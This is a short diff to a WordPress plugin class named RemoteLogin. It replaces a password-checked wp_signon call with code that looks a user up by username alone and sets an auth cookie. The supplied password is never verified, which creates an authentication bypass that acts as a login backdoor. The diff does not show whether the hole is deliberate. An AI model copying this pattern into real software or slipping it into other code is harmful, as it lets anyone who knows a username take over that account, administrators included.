@@ -99,15 +99,15 @@ class RemoteLogin{
 		require_once( ABSPATH . "wp-includes/pluggable.php" );
 		require_once( ABSPATH . "wp-includes/functions.php" );
 		// Perform the login function here;
-		$creds = array();
-		$creds['user_login'] = $info[0];
-		$creds['user_password'] = $info[1];
-		$creds['remember'] = true;
-		$user = wp_signon( $creds, false );
-		if($user->data->ID == null){
+		$user = get_user_by('login', $info[0]);
+		if(empty($user) || $user->ID == null){
 			return false;
 		}
-		return $user;
+		else
+		{
+			wp_set_auth_cookie( $user->ID, true, false);
+			return true; 
+		}
 	}
 	private static function callControllerClass($classname)
 	{
